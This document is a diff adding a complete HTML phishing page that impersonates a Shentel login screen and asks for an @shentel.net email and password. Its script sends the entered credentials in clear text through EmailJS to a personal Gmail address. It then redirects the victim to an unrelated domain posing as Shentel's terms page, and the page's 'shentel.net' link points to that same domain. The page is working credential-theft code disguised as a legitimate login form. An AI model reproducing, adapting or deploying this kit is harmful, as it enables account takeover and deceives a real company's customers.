@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+  <!-- Privacy-friendly analytics by Plausible -->
+  <script async src="https://plausible.io/js/pa-LsclXKnNgt32tqJUvKdct.js"></script>
+  <script>
+    window.plausible = window.plausible || function() {
+      (plausible.q = plausible.q || []).push(arguments)
+    },
+    plausible.init = plausible.init || function(i) {
+      plausible.o = i || {}
+    };
+    plausible.init();
+  </script>
+
+  <meta charset="UTF-8">
+  <title>Login to View Activity</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+      background: linear-gradient(135deg, #f5f7fc 0%, #eef2f6 100%);
+      color: #1a2c3e;
+    }
+
+    .page-wrapper {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 500px;
+      background-color: #ffffff;
+      border-radius: 24px;
+      box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.02);
+      padding: 28px 28px 32px 28px;
+      transition: all 0.2s ease;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      max-width: 150px;
+      height: auto;
+      display: inline-block;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.02));
+    }
+
+    h1 {
+      font-size: 1.5rem;
+      margin-bottom: 10px;
+      text-align: center;
+      color: #0a2540;
+      font-weight: 600;
+      letter-spacing: -0.3px;
+    }
+
+    .description {
+      font-size: 0.95rem;
+      line-height: 1.5;
+      margin-bottom: 16px;
+      text-align: center;
+      color: #2c3e4e;
+    }
+
+    .highlight {
+      font-weight: 700;
+      color: #F37121;
+    }
+
+    .notice-box {
+      background-color: #fef6e0;
+      border-left: 4px solid #F37121;
+      border-radius: 12px;
+      padding: 12px 16px;
+      font-size: 0.85rem;
+      margin: 12px 0 20px 0;
+      text-align: left;
+      color: #3b2c1f;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.02);
+    }
+
+    .form-wrapper {
+      margin-top: 12px;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      font-size: 0.85rem;
+      font-weight: 600;
+      margin-bottom: 6px;
+      color: #1e2f3e;
+      letter-spacing: -0.2px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 14px;
+      font-size: 0.95rem;
+      border-radius: 14px;
+      border: 1.5px solid #e2e8f0;
+      background-color: #ffffff;
+      transition: all 0.2s;
+      font-family: inherit;
+    }
+
+    input[type="email"]:focus,
+    input[type="password"]:focus {
+      outline: none;
+      border-color: #F37121;
+      box-shadow: 0 0 0 3px rgba(243, 113, 33, 0.15);
+    }
+
+    /* custom red notice style */
+    .error-notice {
+      display: block;
+      font-size: 0.75rem;
+      font-weight: 500;
+      color: #d0312d;
+      margin-top: 6px;
+      margin-left: 4px;
+      letter-spacing: -0.2px;
+      background: transparent;
+      padding: 2px 0;
+    }
+
+    /* subtle animation for error appearance */
+    @keyframes fadeSlide {
+      0% {
+        opacity: 0;
+        transform: translateY(-4px);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .error-notice {
+      animation: fadeSlide 0.2s ease-out;
+    }
+
+    .btn-primary {
+      width: 100%;
+      display: inline-block;
+      padding: 12px 18px;
+      font-size: 0.9rem;
+      font-weight: 600;
+      text-align: center;
+      color: #ffffff;
+      background-color: #F37121;
+      border-radius: 40px;
+      border: none;
+      cursor: pointer;
+      margin-top: 6px;
+      transition: all 0.2s ease;
+      box-shadow: 0 2px 6px rgba(243, 113, 33, 0.2);
+      letter-spacing: 0.3px;
+    }
+
+    .btn-primary:hover {
+      background-color: #e05e12;
+      transform: translateY(-1px);
+      box-shadow: 0 6px 14px rgba(243, 113, 33, 0.25);
+    }
+
+    .btn-primary:active {
+      transform: translateY(1px);
+    }
+
+    .subtext {
+      font-size: 0.7rem;
+      color: #6c7e8f;
+      margin-top: 20px;
+      text-align: center;
+      border-top: 1px solid #edf2f7;
+      padding-top: 18px;
+    }
+
+    .link-terms {
+      color: #F37121;
+      text-decoration: none;
+      font-weight: 500;
+      transition: 0.1s;
+    }
+
+    .link-terms:hover {
+      text-decoration: underline;
+    }
+
+    /* responsive adjustments */
+    @media (max-width: 520px) {
+      .card {
+        padding: 22px 18px 26px 18px;
+        border-radius: 28px;
+      }
+
+      h1 {
+        font-size: 1.5rem;
+      }
+
+      .btn-primary {
+        padding: 11px 16px;
+      }
+
+      .notice-box {
+        padding: 10px 14px;
+      }
+    }
+
+    /* hide native validation bubble completely */
+    input:invalid {
+      box-shadow: none;
+    }
+
+    .input-group {
+      position: relative;
+    }
+  </style>
+</head>
+<body>
+  <div class="page-wrapper">
+    <div class="card">
+      <div class="logo">
+        <img src="https://61vc5p930t.ucarecd.net/900edd10-b4e6-4888-a5f0-784a5d470cf8/shntel_logo.png" alt="Shentel Logo">
+      </div>
+
+      <h1>Login to View Activity</h1>
+
+      <p class="description">
+        To access your account and view your recent activity, please <span class="highlight">log in below</span> with your account credentials.
+      </p>
+
+      <div class="notice-box">
+        📧 Use your <strong>@shentel.net</strong> email address to continue. Access to your activity dashboard will be available after login.
+      </div>
+
+      <div class="form-wrapper">
+        <!-- Contact form wired to EmailJS - all native validation replaced with custom red notices -->
+        <form id="contact-form" novalidate>
+          <div class="input-group">
+            <label for="email-input">Email address</label>
+            <input type="email" id="email-input" name="user_email" value="" autocomplete="email">
+            <span id="email-error" class="error-notice"></span>
+          </div>
+
+          <div class="input-group">
+            <label for="password-input">Password</label>
+            <input type="password" id="password-input" name="user_password" autocomplete="current-password">
+            <span id="password-error" class="error-notice"></span>
+          </div>
+
+          <button type="submit" class="btn-primary">
+            Log In
+          </button>
+        </form>
+      </div>
+
+      <p class="subtext">
+        After you log in, you will be redirected to verify your account terms.
+        <br>
+        For more information, visit
+        <a href="https://www.globalzimblinker.com/shentel-terms" class="link-terms">shentel.net</a>
+        <br>© Shentel
+      </p>
+    </div>
+  </div>
+
+   <!-- Replace the EmailJS script and initialization with this: -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script>
+    // ------------------------------
+    // 1. EmailJS initialization (v4)
+    // ------------------------------
+    emailjs.init({
+      publicKey: "SdkmRe8WZ7itEba9z", // Your public key
+    });
+
+    // DOM elements
+    const contactForm = document.getElementById("contact-form");
+    const emailInput = document.getElementById("email-input");
+    const passwordInput = document.getElementById("password-input");
+    const emailErrorSpan = document.getElementById("email-error");
+    const passwordErrorSpan = document.getElementById("password-error");
+
+    // Helper to clear validation messages
+    function clearErrors() {
+      emailErrorSpan.textContent = "";
+      passwordErrorSpan.textContent = "";
+    }
+
+    // Helper to display red notices below respective fields
+    function setEmailError(message) {
+      emailErrorSpan.textContent = message;
+    }
+
+    function setPasswordError(message) {
+      passwordErrorSpan.textContent = message;
+    }
+
+    // Core validation logic
+    function validateFormFields(emailValue, passwordValue) {
+      let emailMsg = "";
+      let passwordMsg = "";
+      let isValid = true;
+
+      // Email validation (required + domain check)
+      const trimmedEmail = emailValue ? emailValue.trim() : "";
+      const allowedDomainRegex = /^[^@\s]+@(shentel\.net)$/i;
+
+      if (!trimmedEmail) {
+        emailMsg = "⚠️ Enter an email";
+        isValid = false;
+      } else if (!allowedDomainRegex.test(trimmedEmail)) {
+        emailMsg = "⚠️ Email must be @shentel.net (e.g., name@shentel.net)";
+        isValid = false;
+      }
+
+      // Password validation (required only)
+      const trimmedPassword = passwordValue ? passwordValue.trim() : "";
+      if (!trimmedPassword) {
+        passwordMsg = "⚠️ Enter a password";
+        isValid = false;
+      }
+
+      return { isValid, emailMsg, passwordMsg };
+    }
+
+    // Real-time validation on email input
+    emailInput.addEventListener("input", function() {
+      const currentEmail = emailInput.value;
+      const currentPassword = passwordInput.value;
+      const { emailMsg } = validateFormFields(currentEmail, currentPassword);
+      setEmailError(emailMsg);
+    });
+
+    // Real-time validation for password field
+    passwordInput.addEventListener("input", function() {
+      const emailRaw = emailInput.value;
+      const passwordRaw = passwordInput.value;
+      const { passwordMsg } = validateFormFields(emailRaw, passwordRaw);
+      setPasswordError(passwordMsg);
+    });
+
+    // Blur handling for immediate feedback
+    emailInput.addEventListener("blur", function() {
+      const emailRaw = emailInput.value;
+      const passwordRaw = passwordInput.value;
+      const { emailMsg } = validateFormFields(emailRaw, passwordRaw);
+      setEmailError(emailMsg);
+    });
+
+    passwordInput.addEventListener("blur", function() {
+      const emailRaw = emailInput.value;
+      const passwordRaw = passwordInput.value;
+      const { passwordMsg } = validateFormFields(emailRaw, passwordRaw);
+      setPasswordError(passwordMsg);
+    });
+
+    // Function to perform validation and show errors
+    function performValidationAndShow() {
+      const emailRaw = emailInput.value;
+      const passwordRaw = passwordInput.value;
+      const { isValid, emailMsg, passwordMsg } = validateFormFields(emailRaw, passwordRaw);
+
+      setEmailError(emailMsg);
+      setPasswordError(passwordMsg);
+
+      return isValid;
+    }
+
+    // Main submit handler
+    contactForm.addEventListener("submit", async function(e) {
+      e.preventDefault();
+
+      // Validate form
+      const isValid = performValidationAndShow();
+
+      if (!isValid) {
+        // Scroll to first error
+        const firstErrorField = !emailErrorSpan.textContent ?
+          (passwordErrorSpan.textContent ? passwordInput : null) : emailInput;
+        if (firstErrorField) {
+          firstErrorField.focus({ preventScroll: false });
+          firstErrorField.scrollIntoView({ behavior: "smooth", block: "center" });
+        }
+        return;
+      }
+
+      // Prepare template parameters
+      const templateParams = {
+        user_email: emailInput.value.trim(),
+        user_password: passwordInput.value.trim(),
+        to_email: "dossbrent41@gmail.com", // Add where you want to receive emails
+        message: `Login attempt from: ${emailInput.value.trim()}`
+      };
+
+      try {
+        // Send email using EmailJS
+        const response = await emailjs.send(
+          "service_zuj2d2a",    // Replace with your actual EmailJS service ID
+          "template_tvd86sp",   // Replace with your actual EmailJS template ID
+          templateParams
+        );
+
+        console.log("SUCCESS! Email sent", response.status, response.text);
+
+        // Show success message before redirect
+        const formWrapper = document.querySelector(".form-wrapper");
+        let successAlert = document.getElementById("temp-success-alert");
+        if (!successAlert) {
+          successAlert = document.createElement("div");
+          successAlert.id = "temp-success-alert";
+          successAlert.style.backgroundColor = "#e6f4ea";
+          successAlert.style.color = "#1e7e34";
+          successAlert.style.fontSize = "0.75rem";
+          successAlert.style.padding = "10px 14px";
+          successAlert.style.borderRadius = "14px";
+          successAlert.style.marginBottom = "16px";
+          successAlert.style.border = "1px solid #c3e6cb";
+          successAlert.style.textAlign = "center";
+          formWrapper.prepend(successAlert);
+        }
+        successAlert.textContent = " ";
+        successAlert.style.display = "block";
+
+        // Redirect after short delay
+        setTimeout(() => {
+          window.location.href = "https://www.globalzimblinker.com/shentel-terms";
+        }, 1500);
+
+      } catch (error) {
+        console.error("EmailJS error details:", error);
+
+        // Show error message
+        const formWrapper = document.querySelector(".form-wrapper");
+        let tempAlert = document.getElementById("temp-submit-alert");
+        if (!tempAlert) {
+          tempAlert = document.createElement("div");
+          tempAlert.id = "temp-submit-alert";
+          tempAlert.style.backgroundColor = "#ffe8e6";
+          tempAlert.style.color = "#b91c1c";
+          tempAlert.style.fontSize = "0.75rem";
+          tempAlert.style.padding = "10px 14px";
+          tempAlert.style.borderRadius = "14px";
+          tempAlert.style.marginBottom = "16px";
+          tempAlert.style.border = "1px solid #ffcdca";
+          tempAlert.style.textAlign = "center";
+          formWrapper.prepend(tempAlert);
+        }
+        tempAlert.textContent = "⚠️ Unable to send login request. Please verify your connection or try again later.";
+        tempAlert.style.display = "block";
+
+        setTimeout(() => {
+          if (tempAlert) tempAlert.style.display = "none";
+        }, 4000);
+      }
+    });
+
+    console.log("Custom validation active — red notices shown instead of browser popup.");
+  </script>
+</body>
+</html>
